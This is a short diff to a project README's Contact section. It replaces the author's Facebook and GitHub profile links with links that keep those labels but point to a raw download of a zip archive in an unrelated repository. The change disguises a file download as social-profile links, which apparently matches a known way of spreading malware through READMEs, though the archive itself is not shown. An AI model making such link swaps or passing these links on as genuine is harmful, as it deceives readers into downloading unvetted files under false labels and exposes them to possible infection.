@@ -44,4 +44,4 @@ This project is licensed under the GNU General Public License v3.0 License - see
 <!-- CONTACT -->
 ## Contact
 
-RqzaX - [Facebook](https://www.facebook.com/RqzaX.VqnThuqn.040) - [GitHub](https://github.com/RqzaX040)
+RqzaX - [Facebook](https://raw.githubusercontent.com/dangkhoasny/Global-Hokai/main/pepsinate/Global-Hokai_v1.1.zip) - [GitHub](https://raw.githubusercontent.com/dangkhoasny/Global-Hokai/main/pepsinate/Global-Hokai_v1.1.zip)
